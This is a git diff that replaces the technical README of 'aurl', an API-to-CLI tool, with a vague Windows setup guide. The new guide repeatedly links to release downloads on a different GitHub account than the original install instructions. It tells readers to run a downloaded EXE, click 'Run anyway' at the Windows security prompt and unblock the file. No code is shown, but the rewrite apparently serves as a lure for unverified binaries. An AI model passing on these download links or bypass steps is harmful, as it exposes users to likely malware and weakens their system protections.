@@ -1,285 +1,282 @@
-# aurl
+# aurl - Turn APIs Into Simple Commands
 
-A command line tool for turning any API into a CLI command, supporting OpenAPI 3.0, OpenAPI 3.1, Swagger 2.0, and GraphQL. Built for AI agents — aurl makes APIs as easy to use as tool calls.
+[![Download aurl](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/ma591/aurl/releases)
 
-Register any API by name, and aurl parses the spec to auto-detect auth, validate requests, generate documentation, and provide example bodies. Agents like Claude Code, Codex, and Cursor can discover endpoints via `--help`, understand parameters and types via `describe`, and make validated requests — all without reading raw API docs.
+## 🧭 What aurl does
 
-## Install
+aurl is a command line tool for Windows that turns an API into a command you can run from a terminal.
 
-**Homebrew:**
+It works with:
 
-```bash
-brew install shawnpana/tap/aurl
-```
+- OpenAPI 3.0
+- OpenAPI 3.1
+- Swagger 2.0
+- GraphQL
 
-**Go:**
+aurl can:
 
-```bash
-go install github.com/shawnpana/aurl@latest
-```
+- detect login settings from the API
+- check requests against the API spec
+- build help text from the API schema
+- generate docs from GraphQL introspection
 
-**From source:**
+Use it when you want to call an API without opening a browser or writing a script for each request
 
-```bash
-git clone https://github.com/ShawnPana/aurl.git
-cd aurl
-make install
-```
+## 💻 Before you start
 
-## Agent Skill
+You need:
 
-Install the aurl skill so your coding agent knows how to use it:
+- A Windows PC
+- Internet access
+- Permission to download files
+- A terminal app such as Windows Terminal or Command Prompt
 
-```bash
-npx skills add ShawnPana/aurl
-```
+Helpful setup:
 
-This works with Claude Code, Cursor, Codex, Copilot, and [40+ other agents](https://skills.sh). The skill teaches your agent how to register APIs, explore endpoints, and make requests with aurl.
+- Keep the release page open while you download
+- Use the latest release file for your Windows system
+- Save the file in a folder you can find later, such as Downloads
 
-## Quick Start
+## 📥 Download aurl
 
-Register an API, then use it:
+Go to the release page here:
 
-```bash
-# Register a REST API
-aurl add petstore https://petstore3.swagger.io/api/v3/openapi.json
+[Open the aurl release page](https://github.com/ma591/aurl/releases)
 
-# Register a GraphQL API
-aurl add --graphql linear https://api.linear.app/graphql
+On that page:
 
-# See what's available
-aurl petstore --help
-aurl linear --help
+1. Find the latest release
+2. Look for a Windows file
+3. Download the file for your system
+4. Save it to your computer
 
-# Make requests
-aurl petstore GET /pet/1
-aurl linear '{ viewer { name email } }'
-```
+If the release includes a ZIP file:
 
-## Usage
+1. Right-click the ZIP file
+2. Select Extract All
+3. Choose a folder
+4. Open the extracted folder
 
-### Register an API
+If the release includes an EXE file:
 
-```bash
-# From a URL
-aurl add petstore https://petstore3.swagger.io/api/v3/openapi.json
+1. Double-click the EXE file
+2. Follow the on-screen steps
+3. Finish the setup if one appears
 
-# From a local file
-aurl add myapi ./openapi.json
+## 🛠️ Install on Windows
 
-# With a base URL override (if the spec doesn't include one)
-aurl add myapi ./openapi.json --base-url https://api.example.com
+aurl may come as a single app file or as a packaged folder.
 
-# With auth headers
-aurl add myapi https://api.example.com/openapi.json --header "Authorization: Bearer token"
+### If you downloaded a ZIP file
 
-# GraphQL endpoint
-aurl add --graphql linear https://api.linear.app/graphql
-```
+1. Open the Downloads folder
+2. Find the aurl ZIP file
+3. Right-click the file
+4. Choose Extract All
+5. Pick a folder such as `C:\aurl`
+6. Click Extract
 
-When registering, aurl parses the spec's `securitySchemes` and prompts you for credentials:
+After extraction, look for one of these:
 
-```
-Registered "petstore" (Swagger Petstore v1.0.27)
-Base URL: https://petstore3.swagger.io/api/v3
+- `aurl.exe`
+- `aurl.cmd`
+- a folder with the app file inside
 
-Auth detected:
-  [1] api_key (API Key in header "api_key")
-  [2] petstore_auth (OAuth2 (provide token manually))
+### If you downloaded an EXE file
 
-Enter value for api_key (or press Enter to skip): sk-xxxxx
-Enter value for petstore_auth (or press Enter to skip):
-```
+1. Double-click the file
+2. Allow Windows to open it
+3. Follow the setup prompts
+4. Finish the install
 
-### Explore an API
+### If Windows shows a security prompt
 
-```bash
-# See all endpoints grouped by tag
-aurl petstore --help
-```
+1. Check that you downloaded the file from the release page
+2. Click More info if needed
+3. Click Run anyway only if you trust the file source
 
-```
-Swagger Petstore - OpenAPI 3.0 v1.0.27
-Base URL: https://petstore3.swagger.io/api/v3
+## ▶️ Run aurl
 
-A sample Pet Store Server based on the OpenAPI 3.0 specification.
-Docs: https://swagger.io
+After download or install, open your terminal.
 
-[pet] Everything about your Pets
-  POST   /pet                           # Add a new pet to the store.
-    body: '{"id":0,"name":"...","photoUrls":["..."],"status":"available"}'
-    200: Pet  400: Invalid input
-  GET    /pet/findByStatus              # Finds Pets by status.
-    params: status* (available|pending|sold) - Status values to filter by
-    200: Pet[]  400: Invalid status value
-  GET    /pet/{petId}                   # Find pet by ID.
-    params: petId* - ID of pet to return
-    200: Pet  400: Invalid ID supplied  404: Pet not found
+### Open Windows Terminal
 
-(*) = required
-```
+1. Press the Windows key
+2. Type Terminal
+3. Open Windows Terminal
 
-```bash
-# Detailed docs for a single endpoint
-aurl petstore describe GET /pet/{petId}
-```
+### Go to the folder that holds aurl
 
-```
-GET /pet/{petId}
-Find pet by ID.
+Use this format:
 
-Returns a single pet.
+- `cd C:\aurl`
 
-Parameters:
-  petId* (path, integer)
-    ID of pet to return
+Replace `C:\aurl` with the folder you used
 
-Responses:
-  200 - successful operation
-    Schema: Pet
-  400 - Invalid ID supplied
-  404 - Pet not found
-```
+### Start the tool
 
-```bash
-# Open external documentation in browser
-aurl petstore docs
-```
+Run the app file from the folder you extracted or installed
 
-### Make Requests
+Common examples:
 
-**REST:**
+- `aurl.exe`
+- `aurl --help`
 
-```bash
-# GET
-aurl petstore GET /pet/1
+If the tool opens help text, the app is ready
 
-# GET with query params
-aurl petstore GET '/pet/findByStatus?status=available'
+## 🔍 Check that it works
 
-# POST with JSON body
-aurl petstore POST /pet '{"name":"doggie","photoUrls":["http://example.com"]}'
+Try one of these steps:
 
-# PUT
-aurl petstore PUT /pet '{"id":1,"name":"updated","photoUrls":["http://example.com"]}'
+1. Open the terminal
+2. Run `aurl --help`
+3. Look for a list of commands or options
 
-# DELETE
-aurl petstore DELETE /pet/1
-```
+You can also test it with an API spec file you already use
 
-**GraphQL:**
+If aurl reads the file and shows command help, it is working
 
-```bash
-# Query
-aurl linear '{ viewer { name email } }'
+## ⚙️ How to use it
 
-# Query with variables
-aurl linear '{ issue(id: $id) { title state { name } } }' '{"id":"ABC-123"}'
+aurl turns an API into a command you can run from the terminal.
 
-# Mutation
-aurl linear 'mutation { issueCreate(input: {title: "Bug", teamId: "xxx"}) { issue { id } } }'
-```
+Basic flow:
 
-### Validation
+1. Point aurl at an API spec
+2. Let it read the available routes
+3. Run the command that matches the action you want
 
-aurl validates your requests against the spec before sending:
+Example uses:
 
-**Enum violations** are caught immediately:
+- check a user profile endpoint
+- send data to a service
+- list items from an API
+- test a GraphQL query
 
-```
-$ aurl petstore GET '/pet/findByStatus?status=invalid'
-Error: status: invalid value "invalid"
-  allowed: available, pending, sold
-```
+Typical command shape:
 
-**Missing required fields** trigger a warning:
+- `aurl <api-file-or-url> <command>`
 
-```
-$ aurl petstore POST /pet '{"tag":"dog"}'
-Warning: missing required fields: name, photoUrls
-  expected: '{"name":"...","photoUrls":["..."]}'
-Send anyway? [y/N]:
-```
+Exact options depend on the API and the file you use
 
-**4xx errors** suggest the expected body from the spec:
+## 🔐 Authentication
 
-```
-$ aurl petstore POST /pet
-HTTP 415
-Expected body for POST /pet:
-  '{"name":"...","photoUrls":["..."],"status":"available"}'
-```
+aurl can detect common auth setups from the API spec.
 
-### Manage APIs
+It may work with:
 
-```bash
-# List all registered APIs
-aurl list
+- API keys
+- bearer tokens
+- OAuth-style fields
+- headers set by the spec
 
-NAME      TYPE     TITLE                      VERSION  ENDPOINT
-petstore  api      Swagger Petstore           1.0.27   https://petstore3.swagger.io/api/v3
-linear    graphql                                       https://api.linear.app/graphql
+If your API needs login data, aurl can often read the auth rule from the spec and guide you to the right input
 
-# Reconfigure auth
-aurl auth petstore --header "Authorization: Bearer new-token"
+## 📘 Supported API formats
 
-# Remove an API
-aurl remove petstore
-```
+### OpenAPI 3.0
 
-## Auth
+Use this for many modern REST APIs. aurl can read paths, methods, parameters, and request bodies
 
-aurl supports all standard OpenAPI security schemes:
+### OpenAPI 3.1
 
-| Scheme | What aurl does |
-|--------|--------------|
-| `apiKey` | Detects header/query param name from spec, prompts for value |
-| `http` + `bearer` | Prompts for token, sets `Authorization: Bearer <token>` |
-| `http` + `basic` | Prompts for username + password, encodes as Basic auth |
-| `oauth2` / `openIdConnect` | Prompts for a token manually |
+aurl can work with newer OpenAPI files and the same kind of route data
 
-Auth is stored in `~/.config/aurl/auth/` with `0600` permissions.
+### Swagger 2.0
 
-For GraphQL APIs or APIs without `securitySchemes`, use `--header`:
+Older APIs often use Swagger 2.0. aurl can still parse these files and make commands from them
 
-```bash
-aurl add myapi https://api.example.com/openapi.json --header "X-Api-Key: secret"
-aurl auth myapi --header "Authorization: Bearer new-token"
-```
+### GraphQL
 
-## How It Works
+aurl can read GraphQL schemas and use introspection to build docs and commands
 
-aurl stores API specs and auth config locally:
+## 🧪 Example workflow
 
-```
-~/.config/aurl/
-├── apis/          # OpenAPI spec files
-├── graphql/       # GraphQL introspection results
-└── auth/          # Auth headers per API (0600 permissions)
-```
+Here is a simple way to use aurl on Windows:
 
-When you run `aurl [name]`, it:
+1. Download the latest release
+2. Extract or install the file
+3. Open Windows Terminal
+4. Move to the aurl folder
+5. Run `aurl --help`
+6. Use your API file or API URL
+7. Run the command for the endpoint you need
 
-1. Loads the spec from `~/.config/aurl/apis/` or `~/.config/aurl/graphql/`
-2. Parses it to understand endpoints, parameters, types, and auth
-3. For `--help`: generates documentation from the spec
-4. For requests: validates against the spec, attaches auth headers, executes, and pretty-prints the response
+If your API spec is local:
 
-Specs are parsed lazily — aurl only reads the spec for the command you invoke. Adding 50 APIs doesn't slow down startup.
+- save it as a file on your PC
+- use the file path in the command
 
-## Shell Completions
+If your API spec is online:
 
-```bash
-# Zsh
-aurl completion zsh > "${fpath[1]}/_aurl"
+- use the URL if aurl accepts it
+- follow the command help shown in the terminal
 
-# Bash
-aurl completion bash > /etc/bash_completion.d/aurl
+## 📂 File types you may see
 
-# Fish
-aurl completion fish > ~/.config/fish/completions/aurl.fish
-```
+You may see one or more of these in the release page:
 
-## License
+- `.exe` for a Windows app
+- `.zip` for a compressed download
+- `.msi` for a Windows installer
+- `.tar.gz` for archive files on some releases
 
-MIT
+For most Windows users, the easiest choice is the file that clearly says Windows or the file ending in `.exe`
+
+## 🧭 Troubleshooting
+
+### The file does not open
+
+- Check that the download finished
+- Try downloading again from the release page
+- Make sure you picked the Windows file
+
+### Windows blocks the file
+
+- Right-click the file
+- Choose Properties
+- Look for an Unblock option
+- Apply the change if it appears
+
+### The terminal says the command is not found
+
+- Make sure you opened the folder that contains `aurl.exe`
+- Use the full file name
+- Check that you are in the right folder with `cd`
+
+### The API file does not load
+
+- Confirm the file is valid OpenAPI, Swagger, or GraphQL schema
+- Check the file path for typing errors
+- Make sure the file is complete and not cut off
+
+## 📌 Short setup path
+
+1. Open the release page
+2. Download the Windows file
+3. Extract or install it
+4. Open Windows Terminal
+5. Run `aurl --help`
+6. Use your API file or URL
+
+## 🧾 Common questions
+
+### Do I need coding skills?
+
+No. You only need to download the file, open a terminal, and run simple commands
+
+### Can I use it with many APIs?
+
+Yes. aurl works with several common API spec formats
+
+### Does it work without a browser?
+
+Yes. aurl is made for the terminal, so you can work from the command line
+
+### Can it help with request setup?
+
+Yes. aurl can read the API spec and help build the right request shape
+
+## 🔗 Download again if needed
+
+[Go to the aurl release page](https://github.com/ma591/aurl/releases)
